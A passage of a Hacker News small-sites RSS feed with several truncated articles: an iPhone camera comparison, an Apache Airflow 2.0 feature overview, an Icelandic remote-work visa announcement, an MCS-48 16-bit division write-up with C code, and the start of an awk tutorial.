<h2 id="night-mode-or-a-night-photo-for-cameras-without-night-mode">Night Mode, or a night photo for cameras without Night Mode</h2>

<p><strong>iPhone 6 Night photo</strong>
<img src="https://joshwithers.blog/uploads/2020/4ff032bb76.jpg"></p>

<p><strong>iPhone SE Night photo</strong>
<img src="https://joshwithers.blog/uploads/2020/c9fb9e6717.jpg"></p>

<p><strong>iPhone XS Night photo</strong>
<img src="https://joshwithers.blog/uploads/2020/4b3ffc1d42.jpg"></p>

<p><strong>iPhone 11 (not Pro) Night Mode photo</strong>
<img src="https://joshwithers.blog/uploads/2020/43025298db.jpg"></p>

<p><strong>iPhone 12 Pro Night Mode photo</strong>
<img src="https://joshwithers.blog/uploads/2020/a4e4a17637.jpg"></p>

<h2 id="video">Video</h2>

<p><strong><a href="https://vimeo.com/473792216/4b27389374">iPhone 6 video</a></strong>
<iframe src="https://player.vimeo.com/video/473792216" width="550" height="306" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe></p>

<p><strong><a href="https://vimeo.com/473792332/ea846c3a08">iPhone SE video</a></strong>
<iframe src="https://player.vimeo.com/video/473792332" width="550" height="306" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe></p>

<p><strong><a href="https://vimeo.com/473792505/ac67864513">iPhone XS video</a></strong>
<iframe src="https://player.vimeo.com/video/473792505" width="550" height="306" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe></p>

<p><strong><a href="https://vimeo.com/473792607/39bd4e5f2e">iPhone 12 video</a></strong>
<iframe src="https://player.vimeo.com/video/473792607" width="550" height="306" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe></p>

  </section></div>]]>
            </description>
            <link>https://joshwithers.blog/2020/10/30/comparing-the-cameras.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24941356</guid>
            <pubDate>Fri, 30 Oct 2020 12:07:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What's Coming in Apache Airflow 2.0]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24941352">thread link</a>) | @mmaia
<br/>
October 30, 2020 | https://www.astronomer.io/blog/introducing-airflow-2-0/ | <a href="https://web.archive.org/web/*/https://www.astronomer.io/blog/introducing-airflow-2-0/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><p><span><img src="https://assets2.astronomer.io/main/blog/airflow-2.png" alt="airflow-2-hero"></span></p></div><div><p>Apache Airflow was created by Airbnb‚Äôs Maxime Beauchemin as an open-source project in late 2014. It was brought into the Apache Software Foundation‚Äôs Incubator Program in March 2016 and saw growing success in the wake of Maxime‚Äôs well-known <a target="_blank" href="https://medium.com/free-code-camp/the-rise-of-the-data-engineer-91be18f1e603">‚ÄúThe Rise of the Data Engineer‚Äù</a> blog post. By January of 2019, Airflow was <a target="_blank" href="https://blogs.apache.org/foundation/entry/the-apache-software-foundation-announces44">announced as a Top-Level Apache Project</a> by the Foundation and is now concretely considered the industry‚Äôs leading workflow orchestration solution.</p><p>Airflow‚Äôs strength as a tool for dataflow automation has grown for a few reasons:</p><p><strong>1. Proven core functionality for data pipelining.</strong>
Airflow competitively delivers in scheduling, scalable task execution and UI-based task management and monitoring.</p><p><strong>2. An extensible framework.</strong>
Airflow was designed to make data integration between systems easy. Today it supports over 55 providers, including AWS, GCP, Microsoft Azure, Salesforce, Slack and Snowflake. Its ability to meet the needs of simple and complex use cases alike make it both easy to adopt and scale.</p><p><strong>3. A large, vibrant community.</strong>
Airflow boasts thousands of users and over 1,600 contributors who regularly submit features, plugins, content and bug fixes to ensure continuous momentum and improvement. In 2020, Airflow reached 10,000 commits and 18,000 GitHub stars.</p><p>As Apache Airflow grows in adoption, there‚Äôs no question that a major release to expand on the project‚Äôs core strengths has been long overdue. As users and members of the community, we at Astronomer are delighted to announce that Airflow 2.0 is in the alpha testing stage and is scheduled to be generally available in December of 2020.</p><p><span><img src="https://assets2.astronomer.io/main/blog/Airflow-2.0-Home.png" alt="Airflow 2.0 Home"></span></p><p>Over the last year, various organizations and leaders within the Airflow Community have been in close collaboration refining the scope of Airflow 2.0 and actively working towards enhancing existing functionality and introducing changes to make Airflow faster, more reliable and more performant at scale.</p><p>In preparation for the highly anticipated release, we‚Äôve put together an overview of major Airflow 2.0 features below. We‚Äôll publish a series of followup posts over the next few weeks that dive deeper into some of those changes.</p></div><div><p>Airflow 2.0 includes hundreds of features and bug fixes both large and small. Many of the significant improvements were influenced and inspired by feedback from <a target="_blank" href="https://airflow.apache.org/blog/airflow-survey">Airflow's 2019 Community Survey</a>, which garnered over 300 responses.</p><h2>A New Scheduler: Low-Latency + High-Availability</h2><p>The Airflow Scheduler as a core component has been key to the growth and success of the project following its creation in 2014. As Airflow matures and the number of users running hundreds of thousands of tasks grows, however, we at Astronomer saw great opportunity in driving a dedicated effort to improve upon Scheduler functionality and push Airflow to a new level of scalability.</p><p>In fact, "Scheduler Performance" was the most asked for improvement in the Community Survey. Airflow users have found that while the Celery and Kubernetes Executors allow for task execution at scale, the Scheduler often limits the speed at which tasks are scheduled and <em>queued</em> for execution. While effects vary across use cases, it's not unusual for users to grapple with induced downtime and a long recovery in the case of a failure and experience high latency between short-running tasks.</p><p>It is for that reason that we‚Äôre beyond ecstatic to introduce a new, refactored Scheduler with the Airflow 2.0 release. The most impactful Airflow 2.0 change in this area is support for running multiple schedulers concurrently in an active/active model. Coupled with DAG Serialization, Airflow‚Äôs refactored Scheduler is now highly available, significantly faster and infinitely scalable. Here's a quick overview of new functionality:</p><p><strong>1. Horizontal Scalability.</strong>
If task load on 1 Scheduler increases, a user can now launch additional "replicas" of the Scheduler to increase the throughput of their Airflow Deployment.</p><p><strong>2. Lowered Task Latency.</strong>
In Airflow 2.0, even a single scheduler has proven to schedule tasks at much faster speeds with the same level of CPU and Memory.</p><p><strong>3. Zero Recovery Time.</strong>
Users running 2+ Schedulers will see zero downtime and no recovery time in the case of a failure.</p><p><strong>4. Easier Maintenance.</strong>
The Airflow 2.0 model allows users to make changes to individual schedulers without impacting the rest and inducing downtime.</p><p>The Scheduler's now-zero recovery time and readiness for scale eliminates it as a single point of failure within Apache Airflow. Given the importance of this change, we'll be putting out a series of followup blog posts that dive deeper into the story behind these improvements alongside an architecture overview and benchmark metrics.</p></div><div><h2>Full REST API</h2><p>Data engineers have been using Airflow‚Äôs ‚ÄúExperimental API‚Äù for years, most often for <a href="https://www.astronomer.io/docs/cloud/stable/customize-airflow/airflow_api">triggering DAG runs programmatically</a>. With that said, the API has historically remained narrow in scope and lacked critical elements of functionality, including a robust authorization and permissions framework.</p><p>Airflow 2.0 introduces a new, comprehensive REST API that sets a strong foundation for a new Airflow UI and CLI in the future. Additionally, the new API:</p><ul><li>Makes for easy access by third-parties</li><li>Is based on the <a target="_blank" href="https://swagger.io/specification">Swagger/OpenAPI Spec</a></li><li>Implements CRUD (Create, Update, Delete) operations on <em>all</em> Airflow resources and </li><li>Includes authorization capabilities (parallel to those of the Airflow UI)</li></ul><p>These capabilities enable a variety of use cases and create new opportunities for automation. For example, users now have the ability to programmatically set Connections and Variables, show import errors, create Pools, and monitor the status of the Metadata Database and Scheduler.</p><p>For more information, you can reference REST API documentation <a target="_blank" href="https://airflow.readthedocs.io/en/latest/stable-rest-api-ref.html">here</a>.</p></div><div><h2>Smart Sensors</h2><p>In the context of dependency management in Airflow, it‚Äôs been common for data engineers to design data pipelines that employ <a href="https://www.astronomer.io/guides/what-is-a-sensor"><em>Sensors</em></a>. Sensors are a special kind of Airflow Operator whose purpose is to wait on a particular trigger, such as a file landing at an expected location or an external task completing successfully. Although Sensors are idle for most of their execution time, they nonetheless hold a ‚Äúworker slot‚Äù that can cost significant CPU and memory.</p><p>The ‚ÄúSmart Sensor‚Äù introduced in Airflow 2.0 is an ‚Äúearly access‚Äù (subject to change) foundational feature that:</p><ul><li>Executes as a single, ‚Äúlong running task‚Äù </li><li>Checks the status of a batch of Sensor tasks</li><li>Stores sensor status information in Airflow‚Äôs Metadata DB</li></ul><p>This feature was proposed and contributed by Airbnb based on their experience running an impressively large Airflow Deployment with tens of thousands of DAGs. For them, Smart Sensors reduced the number of occupied worker slots by over 50% for concurrent loads in peak traffic.</p><p>To learn more, refer to the Airflow docs on Smart Sensors <a target="_blank" href="https://airflow.readthedocs.io/en/latest/smart-sensor.html">here</a>.</p></div><div><h2>TaskFlow API</h2><p>While Airflow has historically shined in scheduling and running idempotent tasks, it has historically lacked a simple way to pass information <em>between</em> tasks. Let's say you are writing a DAG to train some set of Machine Learning models. A first set of tasks in that DAG generates an identifier for each model and a second set of tasks outputs the results generated by each of those models. In this scenario, what's the best way to pass output from those first set of tasks to the latter?</p><p>Historically, <a target="_blank" href="https://airflow.readthedocs.io/en/latest/concepts.html?highlight=Xcoms#xcoms">XComs</a> have been the standard way to pass information between tasks and would be the most appropriate method to tackle the use case above. As most users know, however, XComs are often cumbersome to use and require redundant boilerplate code to set return variables at the end of a task and retrieve them in downstream tasks.</p><p>With Airflow 2.0, we're excited to introduce the TaskFlow API and Task Decorator to address this challenge. The TaskFlow API  implemented in 2.0 makes DAGs significantly easier to write by abstracting the task and dependency management layer from users. Here's a breakdown of incoming functionality:</p><p><strong>1. A framework that automatically creates PythonOperator tasks from Python functions and handles variable passing.</strong>
Now, variables such as Python Dictionaries can simply be passed between tasks as return and input variables for cleaner and more efficient code.</p><p><strong>2. Task dependencies are abstracted and inferred as a result of the Python function invocation.</strong>
This again makes for much cleaner and more simple DAG writing for all users.</p><p><strong>3. Support for Custom XCom Backends.</strong>
Airflow 2.0 includes support for a new <a target="_blank" href="https://airflow.apache.org/docs/stable/concepts.html?highlight=xcom#custom-xcom-backend"><code>xcom_backend</code> parameter</a> that will allow users to pass even more objects between tasks. Out-of-the-box support for S3, HDFS and other tools is coming soon.</p><p>It's worth noting that the underlying mechanism here is still XCom and data is still stored in Airflow‚Äôs Metadata Database, but the XCom operation itself is hidden inside the PythonOperator and is completely abstracted from the DAG developer. Now, Airflow users can pass information and manage dependencies between tasks in a standardized Pythonic manner for cleaner and more efficient code.</p><p>To learn more, refer to Airflow‚Äôs official <a target="_blank" href="https://airflow.readthedocs.io/en/latest/concepts.html#taskflow-api">docs here</a> and the <a target="_blank" href="https://airflow.readthedocs.io/en/latest/tutorial_taskflow_api.html">accompanying tutorial</a>.</p></div><div><h2>Task Groups</h2><p><a target="_blank" href="https://airflow.apache.org/docs/stable/concepts.html?highlight=subdag#subdags">Airflow SubDAGs</a> have long been limited in their ability to provide users with an easy way to manage a large number of tasks. The lack of parallelism coupled with confusion around the fact that SubDAG tasks can only be executed by the Sequential Executor, regardless of which Executor is employed for all other tasks, made for a challenging and unreliable user experience.</p><p>Airflow 2.0 introduces Task Groups as a UI construct that doesn‚Äôt affect task execution behaviour but fulfills the primary purpose of SubDAGs. Task Groups give a DAG author the management benefits of ‚Äúgrouping‚Äù a logical set of tasks with one another without having to look at or process those tasks any differently.</p><p><span><img src="https://assets2.astronomer.io/main/blog/Airflow-2.0-Task-Group.gif" alt="Airflow 2.0 Task Groups"></span></p><p>While Airflow 2.0 will continue to support the SubDAG Operator, Task Groups are intended to replace it in the long-term.</p></div><div><h2>Independent Providers</h2><p>One of Airflow‚Äôs signature strengths is its sizable collection of community-built Operators, Hooks, and Sensors ‚Ä¶</p></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.astronomer.io/blog/introducing-airflow-2-0/">https://www.astronomer.io/blog/introducing-airflow-2-0/</a></em></p>]]>
            </description>
            <link>https://www.astronomer.io/blog/introducing-airflow-2-0/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24941352</guid>
            <pubDate>Fri, 30 Oct 2020 12:07:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Iceland enables foreign experts to live in Iceland while working remotely]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24941283">thread link</a>) | @SolonIslandus
<br/>
October 30, 2020 | https://www.government.is/news/article/2020/10/27/-Foreign-experts-can-work-remotely-in-Iceland/ | <a href="https://web.archive.org/web/*/https://www.government.is/news/article/2020/10/27/-Foreign-experts-can-work-remotely-in-Iceland/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
<div><article data-last-modified="2020-10-27 17:36:00" data-category="type:News"><header><strong><time>October 27, 2020 </time><span>Ministry of Industries and Innovation, Ministry of Justice, Ministry of Finance and Economic Affairs</span></strong></header><div><figure><a href="https://www.government.is/library/01-Ministries/Ministry-of-Industries-and-Innovation/IMG_4200.jpg" data-lightbox="news-image" data-title="Ms. √Åslaug Arna Sigurbj√∂rnsd√≥ttir, Minister of Justice, Ms. √û√≥rd√≠s Kolbr√∫n Reykfj√∂r√∞ Gylfad√≥ttir, Minister of Tourism, Industry and Innovation, Mr. Bjarni Benediktsson, Minister of Finance and Economic affairs."><img src="https://www.government.is/library/01-Ministries/Ministry-of-Industries-and-Innovation/IMG_4200.jpg?proc=singleNewsItem" alt="Ms. √Åslaug Arna Sigurbj√∂rnsd√≥ttir, Minister of Justice, Ms. √û√≥rd√≠s Kolbr√∫n Reykfj√∂r√∞ Gylfad√≥ttir, Minister of Tourism, Industry and Innovation, Mr. Bjarni Benediktsson, Minister of Finance and Economic affairs. - mynd"></a><span></span></figure></div><section><p>The Minister of Tourism, Industry, and Innovation, the Minister of Justice and the Minister of Finance and Economic Affairs have put in place measures to enable non-EEA foreign nationals to reside in Iceland for up to six months and telework for foreign companies. With the measure, those foreign citizens, who are exempt from the visa requirements, will be allowed to apply for a long-term visa in Iceland for teleworkers and bring their families without having to move their legal domicile to the country or obtain Icelandic ID numbers.</p>
<p>In the wake of the COVID-19 epidemic, many companies around the world have made significant changes to the way they operate and are now increasingly allowing and encouraging their staff to telework. The result is that in many instances the staff member can choose their home environment, irrespective of the location of their workplace.</p>
<p>Ms. √û√≥rd√≠s Kolbr√∫n Reykfj√∂r√∞ Gylfad√≥ttir, Minister of Tourism, Innovation and Industry:</p>
<p><em><span>‚ÄúWe need to shape our export industry, based on ingenuity and by making it easier for foreign nationals to work from Iceland, we add value, knowledge and connections in Iceland that support our innovation environment.‚Äù</span></em></p>
<p>At the initiative of the Minister of Innovation, in collaboration with the Ministry of Justice and Ministry of Finance and Economic Affairs, an authorization has been implemented for those who are permanently employed with foreign companies so that they can stay and work in Iceland for up to six months. Until now the authorisation has only been for 90 days. In order to be granted permission for this longer stay, the person in question must demonstrate an employment relationship, income and health insurance. The Icelandic government will keep looking into the matter to find ways of extending the time period, but for now regulations have been changed to accommodate the six month period.</p>
<p>Mr. Bjarni Benediktsson, Minister of Finance and Economic Affairs:</p>
<span>‚Äú<em>We want to ensure that with regards to taxation, there is nothing to prevent the possibility of temporarily allowing individuals working for foreign companies to work from Iceland. We believe that these individuals will bring with them valuable experience and connections that will benefit Iceland on its path to economic recovery from effects of the Covid-19 pandemic</em><span>‚Äù</span>&nbsp;</span>
<p>Ms. √Åslaug Arna Sigurbj√∂rnsd√≥ttir, Minister of Justice:&nbsp;</p>
<p>
<span>‚Äú<em>Fast technological developments call for us to be open and flexible to the growing opportunities available to us that arise when more employers encourage teleworking. The regulatory framework must take this into account.</em>‚Äù</span></p>
<p>Promote Iceland will provide further information and handle promotion of the initiative: <a href="https://www.government.is/cdn-cgi/l/email-protection#a2d5cdd0c9e2cbc1c7cec3ccc68ccbd1"><span data-cfemail="e5928a978ea58c868089848b81cb8c96">[email&nbsp;protected]</span></a>.&nbsp;</p></section><h2>Tags</h2></article></div>

</div><div>
<div>
<p>This website uses cookies to ensure you get the best experience on our website. <a href="https://www.government.is/default.aspx?pageid=c7a1ba64-7428-4803-90e2-cbce7fd71d9b">Read more</a></p>
</div>
</div></div>]]>
            </description>
            <link>https://www.government.is/news/article/2020/10/27/-Foreign-experts-can-work-remotely-in-Iceland/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24941283</guid>
            <pubDate>Fri, 30 Oct 2020 11:57:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[MCS-48: The quest for 16-bit division on the 8-bit CPU which can‚Äôt divide]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 28 (<a href="https://news.ycombinator.com/item?id=24941189">thread link</a>) | @noexani
<br/>
October 30, 2020 | http://tech.mattmillman.com/mcs-48-the-quest-for-16-bit-division-on-the-8-bit-cpu-which-cant-divide-anything/ | <a href="https://web.archive.org/web/*/http://tech.mattmillman.com/mcs-48-the-quest-for-16-bit-division-on-the-8-bit-cpu-which-cant-divide-anything/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-4862">
	
	<!-- .entry-header -->

		<div>
		
<p>Recently while working on my <a href="http://tech.mattmillman.com/projects/an-intel-mcs-48-based-dual-temperature-sensor/">MCS-48 temperature sensor</a> project I had to confront one of the largest challenges, which is to implement an option where changing a jumper displayed Fahrenheit instead of Celsius. The output from the DS18B10 temperature sensors is Celsius only, as it should be, so a conversion would need to be performed.</p>



<figure><img src="http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/CodeCogsEqn.gif" alt=""><figcaption>A quick reminder of the conversion needed to be performed</figcaption></figure>



<p>In my case it‚Äôs +320 as I‚Äôm using fixed point arithmetic i.e. 15.3¬∞ = 153. This is a tough conversion to perform on an MCS-48 as we‚Äôve got a bunch of different operations needed here:</p>



<ul><li>16-bit negate (more about that below)</li><li>16-bit unsigned multiply</li><li>16-bit unsigned divide</li><li>16-bit add with wrap-around</li></ul>



<p>A tall order for a CPU which has just <em>one </em>math instruction: 8-bit add. To perform all of this, one must sling a long sequence of primitive instructions together. Since this is an assembly language only architecture, I couldn‚Äôt cheat by compiling it in C and pinching the resulting instructions as I have done for PIC16 in the past.</p>



<p>The best place to find such examples is in the MCS-48 assembly language manual:</p>



<figure><a href="http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/manual.jpg"><img src="http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/manual-800x638.jpg" alt="" srcset="http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/manual-800x638.jpg 800w, http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/manual-300x239.jpg 300w, http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/manual-150x120.jpg 150w, http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/manual-768x612.jpg 768w, http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/manual-1536x1224.jpg 1536w, http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/manual-2048x1633.jpg 2048w" sizes="(max-width: 800px) 100vw, 800px"></a></figure>



<p>(A scan of it can be viewed <a href="http://www.nj7p.org/Manuals/PDFs/Intel/9800255D.pdf">here</a>). Everything I needed was in there, except how to divide. There is no mention whatsoever in that manual of how to perform any kind of division operation, <em>but</em>, tacked in the back of the 1980 edition MCS-48 handbook, I found this:</p>



<figure><a href="http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/isisdiv.png"><img src="http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/isisdiv-623x800.png" alt="" srcset="http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/isisdiv-623x800.png 623w, http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/isisdiv-233x300.png 233w, http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/isisdiv-117x150.png 117w, http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/isisdiv-768x987.png 768w, http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/isisdiv-1195x1536.png 1195w, http://techmattmillman.s3.amazonaws.com/wp-content/uploads/2020/10/isisdiv.png 1263w" sizes="(max-width: 623px) 100vw, 623px"></a><figcaption>Woohoo! A working divide routine for MCS-48. It wouldn‚Äôt OCR, so I typed it up.</figcaption></figure>



<p>Unfortunately that routine only has an 8-bit quotient, which isn‚Äôt much use for my application because it would overflow in most cases.</p>



<p>I was easily able to work around that with the following implementation (pseudo code):</p>



<pre><code>if (celsius &lt; 0)
{   // If negative, note it, and make it positive
    // so we can work with simpler unsigned routines below
    celsius = -celsius;
    is_negative = 1;
}

fahrenheit = multiply_16x8r16(celsius, 9);

// Divide by 50 so the result of divide_16x8r8 doesn't overflow
fahrenheit = divide_16x8r8(fahrenheit, 50, &amp;remainder);

// Multiply it back up
fahrenheit = multiply_16x8r16(fahrenheit, 10);

// Factor remainder
remainder = multiply_16x8r16(remainder, 10);

// Divide and add remainder
fahrenheit += divide_16x8r8(remainder, 50, NULL);

if (is_negative)
{   // Make it negative again, if it was previously
    is_negative = 1;
}

// Add 32. Requires a 16-bit add with wrap around to
// correctly handle negative temperatures
fahrenheit += 320</code></pre>



<p>While that does the job, it‚Äôs poo poo. What I really want is that complicated looking divide routine to have a 16-bit quotient, so I can do the division in a single operation. To help me understand it, I translated it to C code:</p>



<pre><code>uint8_t mcs48_divide(uint16_t dividend, uint8_t divisor, uint8_t *remainder)
{
    if ((dividend &gt;&gt; 8) &gt;= divisor)
        goto mcs48_div_exit; // Impossible. Result would
                             // overflow. Bail.

    for (int i = 0; i &lt; 8; i++) // One pass for each bit of result
    {
        uint8_t msb;
        uint8_t bit15_was_set = 0;

        if (dividend &amp; 0x8000)
            bit15_was_set = 1; // Note if this was set,

        dividend &lt;&lt;= 1; // Next bit

        msb = (dividend &gt;&gt; 8);
        if (msb &gt;= divisor || bit15_was_set)
        {
            // Subtract remainder from MSB,
            // preserve and increment quotient
            dividend = (((msb - divisor) &lt;&lt; 8) | (dividend &amp; 0xFF)) + 1;
        }
    }

mcs48_div_exit:
    *remainder = (dividend &gt;&gt; 8);
    return (dividend &amp; 0xFF);
}</code></pre>



<p>It‚Äôs immediately clear that it‚Äôs a <a href="https://www.wikihow.com/Divide-Binary-Numbers">binary division</a> implementation. What wasn‚Äôt immediately clear is how to make the change I wanted. I put the question to <a href="https://stackoverflow.com/questions/64544654/can-anyone-figure-out-how-to-extend-this-software-divide-routine-to-have-a-16-bi/64549557#64549557">stack overflow</a>, and on the face of it, it looked like a dumb question, i.e. just double the integer type sizes, <em>stupid</em>. predictably I got punished with a bunch of down-votes.</p>



<p>Yes we can do that, but it‚Äôs not what I want to do to the assembly routine that I‚Äôm trying to modify, so perhaps I didn‚Äôt quite ask the question as well as I could have done. The answer provided sent me in the right direction, in that the working accumulator needs to be larger, 24-bits in my case, and the 16-bit shift needs to be a 24-bit.</p>



<pre><code>uint16_t mcs48_div16(uint16_t dividend, uint8_t divisor, uint8_t *remainder)
{
    uint32_t accumulator = dividend;

    for (int i = 0; i &lt; 16; i++) // One pass for each bit of result
    {
        uint8_t msb;
        uint8_t bit24_was_set = 0;

        if (accumulator &amp; 0x800000)
            bit24_was_set = 1; // Note if this was set,
                               // can't check if after shift.

        accumulator &lt;&lt;= 1; // Next bit
        accumulator &amp;= 0xFFFFFF; // Simulate 24 bit type

        msb = (accumulator &gt;&gt; 16);
        if (msb &gt;= divisor || bit24_was_set)
        {
            // Subtract remainder from MSB,
            // preserve and increment quotient
            accumulator = (((msb - divisor) &lt;&lt; 16) | (accumulator &amp; 0xFFFF)) + 1;
        }
    }

mcs48_div_ext_exit:
    *remainder = (accumulator &gt;&gt; 16);
    return (accumulator &amp; 0xFFFF);
}</code></pre>



<p>Above is the pseudo code of my routine after the changes. In the final implementation registers A, R1 and R2 hold the 24-bit accumulator, so this doesn‚Äôt translate too well to C because there isn‚Äôt a 24-bit integer type.</p>



<p>The final changes to the routine can be viewed <a href="https://github.com/inaxeon/mcs48temp/compare/e006467..a531d32">here</a>.</p>



<p>Ah, that‚Äôs better.</p>
	</div><!-- .entry-content -->
	
	</article></div>]]>
            </description>
            <link>http://tech.mattmillman.com/mcs-48-the-quest-for-16-bit-division-on-the-8-bit-cpu-which-cant-divide-anything/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24941189</guid>
            <pubDate>Fri, 30 Oct 2020 11:39:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Awk: `Begin { ` Part 1]]>
            </title>
            <description>
<![CDATA[
Score 208 | Comments 96 (<a href="https://news.ycombinator.com/item?id=24940661">thread link</a>) | @quyleanh
<br/>
October 30, 2020 | https://jemma.dev/blog/awk-part-1 | <a href="https://web.archive.org/web/*/https://jemma.dev/blog/awk-part-1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>The other day, I was watching Bryan Cantrill‚Äôs 2018 talk, <a href="https://www.youtube.com/watch?v=2wZ1pCpJUIM">Rust, and Other Interesting Things</a>, and he made an offhanded comment while discussing values of different programming languages and communities. He said, ‚ÄúIf you get the <a href="https://www.gnu.org/software/gawk/manual/gawk.html">awk programming language manual</a>‚Ä¶you‚Äôll read it in about two hours and then you‚Äôre done. That‚Äôs it. You know all of awk.‚Äù</p>

<p>Only two hours to learn an entire language?! ‚Ä¶. Challenge accepted!</p>

<p>I had previously used snippets of awk here and there. Most of them were given to me by Stack Overflow answers when googling for niche data file manipulations. But, I did not know enough to successfully write an awk program from scratch. I definitely did not have a real grasp on the language nor its power. And, a couple of hours sounded like a relatively small time investment to learn what Bryan Cantrill said was a language he used three times a day.</p>

<p>It turns out it takes more than two hours to learn awk, and I am by no means an expert‚Ä¶ yet (growth mindset!). But, I now know enough to write a little about the essentials. Here goes!</p>

<h3 id="what-is-awk-useful-for">What is awk useful for?</h3>

<p>Awk is useful for data file manipulation. Already, having used it for a few days only, I wish I had invested time in learning it earlier. My usual workflow when encountering a data file is to import it into Google Sheets and use their builtin functions. If those weren‚Äôt enough, I would write little code snippets to somewhat awk..wardly get the information I want. Awk is way more powerful than what I was doing before. Let‚Äôs take a look:</p>

<h3 id="running-awk-programs">Running awk programs</h3>

<p>If we‚Äôre going to learn awk, we need to know how to run an awk program. The syntax to run an awk program in a shell is:</p>
<div><div><pre><code><span>$ </span><span>awk</span> <span>'awk_program_contents'</span> data-file-1 data-file-2
</code></pre></div></div>
<p>We can also write a longer awk program to run instead of writing the awk code inline. We could write a file with awk codeand then pass inline to awk with <code>-f &lt;awk-program-filename&gt;</code></p>
<div><div><pre><code><span>$ </span><span>awk</span> <span>-f</span> awk-program.awk data-file-1 data-file-2
</code></pre></div></div>

<h3 id="awk-program-contents">awk program contents</h3>

<p>Well, what is an awk program? We know it is best used for simple data reformatting or manipulation. The way it does this is by performing different actions on different patterns within a data file. The basic syntax of an awk program depends on these pattern and actions.</p>

<div><div><pre><code>pattern <span>{</span> action <span>}</span>
pattern <span>{</span> action <span>}</span>
...
</code></pre></div></div>

<p>We can give as many <code>pattern { action }</code> pairs as we want. Each pair will be executed independently of the others. This means if a line matches more than one pattern, it will have more than one corresponding action. In the example above we use newlines to separate distinct pairs. Similar to bash, we can also use <code>;</code> to separate commands and put everything on one line: <code>pattern { action }; pattern { action }</code></p>

<h3 id="awk-with-data-files">awk with data files</h3>

<p>But, it turns out awk is much more useful (and fun!) with a data file. The UN has a few <a href="https://data.un.org/">publicly available datasets</a>. I picked <a href="https://data.un.org/_Docs/SYB/CSV/SYB62_309_201906_Education.csv">this one</a> on education at the primary, secondary and tertiary levels to delve into first.</p>

<p>Let‚Äôs start by using awk to get a sense of what the data looks like.  <code>NR</code> is a predefined variable which records the number of rows read in a file so far. We can use it to look at the first few lines of a program. In this case, our pattern will be <code>NR &lt;= 5</code>, and by not including an action, the implied action will be <code>print</code>:</p>
<div><div><pre><code><span>$ </span><span>awk</span> <span>'NR &lt;= 5'</span> education.csv
T07,<span>"Enrolment in primary, secondary and tertiary education levels"</span>,,,,,
Region/Country/Area,,Year,Series,Value,Footnotes,Source
1,<span>"Total, all countries or areas"</span>,2005,Students enrolled <span>in </span>primary education <span>(</span>thousands<span>)</span>,<span>"678,991.6070"</span>,,<span>"United Nations Educational, Scientific and Cultural Organization (UNESCO), Montreal, the UNESCO Institute for Statistics (UIS) statistics database, last accessed March 2019."</span>
1,<span>"Total, all countries or areas"</span>,2005,Gross enrollement ratio - Primary <span>(</span>male<span>)</span>,104.9360,,<span>"United Nations Educational, Scientific and Cultural Organization (UNESCO), Montreal, the UNESCO Institute for Statistics (UIS) statistics database, last accessed March 2019."</span>
1,<span>"Total, all countries or areas"</span>,2005,Gross enrollment ratio - Primary <span>(</span>female<span>)</span>,99.9214,,<span>"United Nations Educational, Scientific and Cultural Organization (UNESCO), Montreal, the UNESCO Institute for Statistics (UIS) statistics database, last accessed March 2019."</span>
</code></pre></div></div>
<p>Okay, so looks like this is giving us a bit of information about our file. Notably:</p>
<ol>
  <li>There are two header rows: a title row, and a row telling us what the fields are</li>
  <li>The file is comma separated</li>
  <li>‚Ä¶ except there are sometimes commas within double quoted strings: <code>"Total, all countries or areas"</code></li>
</ol>

<p>Let‚Äôs address these one by one!</p>



<p>We can ignore the first two header rows by using our nifty <code>NR</code> moving forward. We can pattern match that <code>NR &gt; 2</code>. Note: awk is 1-indexed.</p>
<div><div><pre><code><span>$ </span><span>awk</span> <span>'NR &gt; 2'</span> education.csv
</code></pre></div></div>

<h3 id="field-separators">Field Separators</h3>

<p>awk‚Äôs <a href="https://www.gnu.org/software/gawk/manual/gawk.html#Default-Field-Splitting">default field separator</a> is a space. We can actually see this by printing the first field. To access the value of a field, we use <code>$&lt;field_index&gt;</code>. So <code>$1</code> is the first field, <code>$2</code> the second, and so on. <code>$0</code> refers to the entire row.</p>

<p>If we try this:</p>
